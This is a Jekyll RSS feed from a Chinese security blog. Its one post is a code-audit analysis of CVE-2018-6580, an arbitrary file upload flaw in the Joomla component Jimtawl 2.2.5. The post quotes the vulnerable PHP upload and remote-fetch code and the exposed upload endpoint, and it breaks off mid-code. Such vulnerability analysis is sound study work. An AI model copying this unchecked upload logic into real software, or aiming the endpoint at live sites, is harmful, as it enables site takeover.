<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>倾旋的博客</title>
    <description>&lt;h1 style='color:white;'&gt;倾旋的博客&lt;/h1&gt;&lt;h3&gt;岁月静好，现世安稳。&lt;/h3&gt;</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 09 Feb 2018 12:50:10 +0800</pubDate>
    <lastBuildDate>Fri, 09 Feb 2018 12:50:10 +0800</lastBuildDate>
    <generator>Jekyll v3.7.2</generator>
    
      <item>
        <title>关于CVE-2018-6580其他Tips分析</title>
        <description>&lt;p&gt;本文分析一下CVE-2018-6580漏洞的产生原因
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;

&lt;p&gt;很久没有代码审计了，无意的逛着Exploit-DB看到了几个关于Joomla!的漏洞，想分析一下看看。&lt;/p&gt;

&lt;p&gt;审计环境：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;组件&lt;/th&gt;
      &lt;th&gt;组件版本&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Joomla&lt;/td&gt;
      &lt;td&gt;3.8.5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Apache&lt;/td&gt;
      &lt;td&gt;2.4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PHP&lt;/td&gt;
      &lt;td&gt;5.4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;操作系统&lt;/td&gt;
      &lt;td&gt;Windows7&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;0x02-漏洞简介&quot;&gt;0X02 漏洞简介&lt;/h2&gt;

&lt;p&gt;Exploit-DB地址：https://www.exploit-db.com/exploits/43958/&lt;/p&gt;

&lt;p&gt;该漏洞不是Joomla的漏洞，是其中一个组件的漏洞，名字叫“Jimtawl”，漏洞版本是：“2.2.5”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;组件下载地址：http://janguo.de/lang-en/joomla-25-higher/jimtawl/pkg_jimtawl-2-2-5-current-r561-zip.raw&lt;/li&gt;
  &lt;li&gt;https://extensions.joomla.org/extension/jimtawl/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jimtawl代表网络上的一个电台。向访问者显示您的节目日历，节目详情，播放列表以及正在播放的人员。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;功能如下：&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;提供广播节目：广播时间，下一个广播日期，说明，团队，联系人，网站&lt;/li&gt;
  &lt;li&gt;介绍主持人和编辑的东西：名字，图片，描述&lt;/li&gt;
  &lt;li&gt;为当前节目安排和创建播放列表&lt;/li&gt;
  &lt;li&gt;呈现细分：标题，文字，音频，类别，流派，图像&lt;/li&gt;
  &lt;li&gt;导航程序日历&lt;/li&gt;
  &lt;li&gt;分段存档&lt;/li&gt;
  &lt;li&gt;模块“现在谁在空中”&lt;/li&gt;
  &lt;li&gt;支持Joomlas搜索&lt;/li&gt;
  &lt;li&gt;Podcast Feed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;它的漏洞产生原因是任意文件上传，你一定会觉得匪夷所思，Joomla这么成熟的项目，它们的组件会不会也比较安全？ You are wrong..&lt;/p&gt;

&lt;h2 id=&quot;0x03-代码分析&quot;&gt;0x03 代码分析&lt;/h2&gt;

&lt;p&gt;Exploit-DB上给出了一些简短的描述，但是这也足够了，我们可以通过URL找到漏洞对应的代码。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;index.php?option=com_jimtawl&amp;amp;view=upload&amp;amp;task=upload&amp;amp;pop=true&amp;amp;tmpl=component&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个页面是用来上传文件地方。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/components/com_jimtawl/models/media.php&lt;/code&gt; 107 Lines :&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		
		&lt;span class=&quot;nx&quot;&gt;jimport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'joomla.filesystem.path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jimport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'joomla.filesystem.file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JComponentHelper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;getParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'com_jimtawl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jimtawl_fileinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;upload_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JPATH_SITE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'upload_dir'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/media/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;is_local&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
			&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 	&lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wav'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_get_localfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ogg'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mp3'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_get_local_fileinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_move_uploaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_get_remotefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_fileinfo_from_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'userfile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
				&lt;span class=&quot;nb&quot;&gt;unset&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'userfile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_move_uploaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_setMediaType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_import_media&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;		
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;......&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该方法主要是来处理上传逻辑的，可以看到一开始就先获取一些优先文件，例如：&lt;code class=&quot;highlighter-rouge&quot;&gt;wav,ogg,mp3&lt;/code&gt;这类的会被分别调用&lt;code class=&quot;highlighter-rouge&quot;&gt;_get_localfile&lt;/code&gt;方法去进行上传。&lt;/p&gt;

&lt;p&gt;我们主要关注的还是从&lt;code class=&quot;highlighter-rouge&quot;&gt;if($url)&lt;/code&gt;开始：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_get_remotefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_fileinfo_from_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'userfile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;unset&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'userfile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_move_uploaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟踪一下&lt;code class=&quot;highlighter-rouge&quot;&gt;_get_remotefile&lt;/code&gt;函数：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_get_remotefile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 当我们的URL传递进来后先解析URL地址&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$pathinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取URI&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;upload_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fsockopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$errstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 连接远程服务器&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;nb&quot;&gt;fputs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HEAD &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; HTTP/1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span 